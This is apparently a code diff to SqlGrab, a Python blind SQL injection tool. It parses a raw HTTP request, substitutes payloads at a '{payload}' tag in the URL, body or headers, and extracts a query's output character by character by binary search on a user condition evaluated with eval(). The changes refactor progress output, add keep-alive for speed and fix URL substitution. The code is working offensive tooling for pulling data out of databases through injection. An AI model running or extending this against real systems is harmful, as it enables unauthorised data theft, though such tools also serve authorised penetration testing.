@@ -1,6 +1,5 @@
 from requests import Request, Session
 import time
-import sys
 import math
 import urllib.parse
 import urllib3
@@ -13,6 +12,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 class HTTPRequest(BaseHTTPRequestHandler):
     ''' Used for parsing raw HTTP requests '''
+
     def __init__(self, request_text):
         self.rfile = BytesIO(request_text)
         self.raw_requestline = self.rfile.readline()
@@ -52,7 +52,7 @@ class SqlGrab:
 
     initialLength = 16
     initialCharacter = ord('Z')
-    payloadLocations = []
+    locations = []  # informational - locations within the request that the payload appears
 
     def __init__(self, options):
         # set options
@@ -74,17 +74,17 @@ class SqlGrab:
             # parse the base request from file
             self.request = self.parseRequest(options.host, options.request)
             print(
-                f'[*] Query: \'{options.query}\'. Inserting payload into {", ".join(self.payloadLocations)}. Determining length...')
+                f'[*] Query: \'{options.query}\'. Inserting payload into {", ".join(self.locations)}.')
 
             # get the length of the query output
             length = self.getLength(query=options.query)
-            print(f'[*] The query output is {length} characters in length.')
+            print()
 
             # retrieve the output
             result = self.getString(query=options.query, length=length)
             print(f'\n{result}\n')
 
-        except Exception as e:
+        except RuntimeError as e:
             print(e)
         except KeyboardInterrupt:
             print('\n[!] Interrupted')
@@ -93,7 +93,7 @@ class SqlGrab:
         ''' Takes a conditional statement from command line arguments and determines the truth value of the query based on it. '''
         return eval(self.condition, locals())
 
-    def getValue(self, payload, args, range=(0, math.inf), context=None, ):
+    def getValue(self, payload, args, range=(0, math.inf), context={}, status=None):
         """ Determines the value of a vairable based on iterative halving/doubling of the search space """
         min, max = range
 
@@ -111,10 +111,8 @@ class SqlGrab:
                 # narrow down between that range
                 args['value'] = min + int((max - min) / 2)
 
-            if context:
-                print(
-                    f"[*] [\x1B[90m{context['i']}/{context['length']}: Between \'{chr(min)}\' and \'{chr(max)}\'\x1B[0m] \x1B[32m{context['result']}\x1B[0m", end='\r'
-                )
+            if status:
+                print(status.format(context=context, min=min, max=max), end='\r')
 
             time.sleep(self.delay)
 
@@ -126,7 +124,10 @@ class SqlGrab:
         return args['value']
 
     def getLength(self, **args):
-        return self.getValue(self.payloads['length'], args=dict(**args, value=self.initialLength))
+        return self.getValue(
+            self.payloads['length'],
+            args=dict(**args, value=self.initialLength),
+            status="[*] Determining length... (\x1B[90mBetween {min} and {max}\x1B[0m\x1B[0m)")
 
     def getString(self, length, **args):
         ''' Determines the value of each character in a [length]-long string '''
@@ -139,6 +140,7 @@ class SqlGrab:
                 payload=self.payloads['character'],
                 range=(0x20, 0x7E),  # range of printable ASCII characters
                 context={'i': i, 'length': length, 'result': result},
+                status="[*] [\x1b[90m{context[i]}/{context[length]}: Between '{min:c}' and '{max:c}'\x1b[0m] \x1b[32m{context[result]}\x1b[0m",
                 args=dict(**args, index=i, value=self.initialCharacter)
             ))
 
@@ -154,12 +156,15 @@ class SqlGrab:
 
         prepared = self.request.prepare()
 
+        # Default to keepalive; speed increase
+        prepared.headers['Connection'] = 'keep-alive'
+
         payload = payload.format(**args)
         if self.urlencode:
             urllib.parse.quote_plus(payload)
 
         # perform {payload} tag subsitution
-        prepared.url.replace('%7Bpayload%7D', urllib.parse.quote_plus(
+        prepared.url = prepared.url.replace('%7Bpayload%7D', urllib.parse.quote_plus(
             payload))  # URL payload will always be urlencoded
 
         if prepared.body:
@@ -200,16 +205,16 @@ class SqlGrab:
             tag = '{payload}'
 
             if tag in request.url:
-                self.payloadLocations.append('url')
+                self.locations.append('url')
             if request.data and tag in request.data:
-                self.payloadLocations.append('body')
+                self.locations.append('body')
             for key, value in request.headers._headers:
                 if tag in key:
-                    self.payloadLocations.append('{key} header key')
+                    self.locations.append('{key} header key')
                 if tag in value:
-                    self.payloadLocations.append(f'{key} header value')
+                    self.locations.append(f'{key} header value')
 
-            if not self.payloadLocations:
+            if not self.locations:
                 raise Exception(
                     'The parsed request file does not contain a \'{payload}\' tag.')
 
